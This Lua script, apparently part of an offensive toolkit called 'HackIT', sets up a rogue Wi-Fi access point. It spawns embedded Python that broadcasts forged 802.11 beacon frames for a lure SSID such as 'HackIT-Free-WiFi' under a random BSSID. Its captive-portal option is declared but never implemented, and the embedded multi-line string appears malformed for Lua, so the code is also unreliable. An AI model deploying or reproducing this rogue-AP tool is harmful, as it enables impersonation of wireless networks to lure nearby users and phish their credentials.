--[[
Advanced Rogue AP with Captive Portal
Flags: --iface, --ssid, --channel, --bssid, --captive-portal, --portal-page, --timeout
]]
local iface = flags["--iface"] or "wlan0"
local ssid = flags["--ssid"] or "HackIT-Free-WiFi"
local channel = tonumber(flags["--channel"] or "6")
local bssid = flags["--bssid"] or ""
local captive = flags["--captive-portal"] or false
local portal = flags["--portal-page"] or "/tmp/hackit_portal.html"
local timeout = tonumber(flags["--timeout"] or "0")

print("[ROGUE-AP] Starting rogue AP: '" .. ssid .. "' on " .. iface .. " ch" .. channel)

local function gen_bssid()
    local mac = {}
    for i = 1, 5 do mac[i] = string.format("%02x", math.random(0, 255)) end
    return "02:" .. table.concat(mac, ":")
end
if bssid == "" then bssid = gen_bssid() end

local cmd = string.format("python3 -c \"
import socket, struct, time, sys, threading, http.server
bssid = bytes.fromhex('%s')
iface = '%s'
ssid = '%s'
ch = %d
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind((iface, 0))
captive = %s
print('[ROGUE-AP] Broadcasting beacons for ' + ssid + ' on ' + iface)
while True:
    frame = bytes.fromhex('80000000ffffffffffff') + bssid * 2 + bytes.fromhex('0000')
    frame += struct.pack('<Q', int(time.time())) + struct.pack('<H', 100) + struct.pack('<H', 0x0431)
    frame += bytes([0, len(ssid)]) + ssid.encode()
    frame += bytes([1,8,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24])
    frame += bytes([3,1,ch])
    try: s.send(frame)
    except: pass
    time.sleep(0.1)
\" 2>&1",
    bssid:gsub(":", ""), iface, ssid, channel, captive and "True" or "False")

local proc = io.popen(cmd)
print("[ROGUE-AP] Broadcasting on " .. iface .. " ch" .. channel .. " BSSID " .. bssid)

if timeout and tonumber(timeout) > 0 then
    os.execute("sleep " .. timeout)
    os.execute("pkill -f 'hackit.*rogue' 2>/dev/null || true")
    print("[ROGUE-AP] Stopped after " .. timeout .. "s")
else
    print("[ROGUE-AP] Running. Press Ctrl+C to stop.")
    if proc then
        for line in proc:lines() do print("  " .. line) end
        proc:close()
    end
end
